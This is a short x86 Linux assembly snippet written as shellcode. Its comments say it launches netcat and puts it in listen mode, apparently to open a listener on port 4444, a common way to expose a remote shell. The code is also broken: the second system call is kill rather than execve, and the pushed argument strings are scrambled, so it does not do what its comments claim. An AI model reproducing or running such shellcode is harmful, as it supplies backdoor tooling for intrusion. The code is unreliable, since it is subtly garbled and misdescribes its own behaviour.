section .text
    global _start

_start:
    ; load netcat into memory
    xor eax, eax
    mov al, 0xb
    xor ecx, ecx
    push ecx
    push 0x636e2f2f
    push 0x6e69622f
    mov ebx, esp
    xor edx, edx
    int 0x80

    ; run netcat in listen mode
    xor eax, eax
    mov al, 0x3e
    xor ecx, ecx
    push ecx
    push 0x2d6c6973
    push 0x2d702034
    push 0x34343434
    push 0x6e63654c
    mov ebx, esp
    xor edx, edx
    int 0x80
